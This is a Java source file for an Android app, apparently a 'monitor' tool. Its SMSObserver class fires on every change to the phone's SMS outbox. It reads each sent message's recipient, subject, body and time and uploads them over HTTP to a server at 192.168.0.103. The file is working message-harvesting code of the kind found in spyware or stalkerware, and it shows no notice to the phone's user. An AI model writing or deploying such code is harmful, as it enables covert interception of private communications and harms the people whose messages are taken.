package com.liuchengjie.monitormachine;

import java.sql.Date;
import java.text.SimpleDateFormat;
import java.util.HashMap;

import android.content.Context;
import android.database.ContentObserver;
import android.database.Cursor;
import android.net.Uri;
import android.os.Handler;

public class SMSObserver extends ContentObserver{

	private Context context;
	
	public SMSObserver(Handler handler, Context context) {
		super(handler);
		this.context = context;
		// TODO Auto-generated constructor stub
	}
	
	@Override
	public void onChange(boolean selfChange){
		//TODO Auto-generated method stub
		//查询发件箱中的短信
		Cursor cursor = context.getContentResolver().query(
				Uri.parse("content://sms/outbox"), null, null, null, null);
		
		while(cursor.moveToNext()){
//			StringBuffer sb = new StringBuffer();
			//get send phone number
			String address = cursor.getString(cursor.getColumnIndex("address"));
			//get the sms message title
			String title = cursor.getString(cursor.getColumnIndex("subject"));
			//get the sms message content
			String content = cursor.getString(cursor.getColumnIndex("body"));
			//get the sms message dateTime
			Date date = new Date(cursor.getLong(cursor.getColumnIndex("date")));
			SimpleDateFormat sdf = new SimpleDateFormat("yyyy-MM-dd HH:mm:ss");
			String datetime = sdf.format(date);
			HashMap<String, Object> h = new HashMap<String, Object>();
			h.put("address", address);
			h.put("title", title);
			h.put("content", content);
			h.put("datetime", datetime);
			h.put("operate_kind", 0);
			
			SendHttpRequest run = new SendHttpRequest("http://192.168.0.103:8080/sms/add", h);
			Thread t = new Thread(run);
			t.start();
		}
	}

}
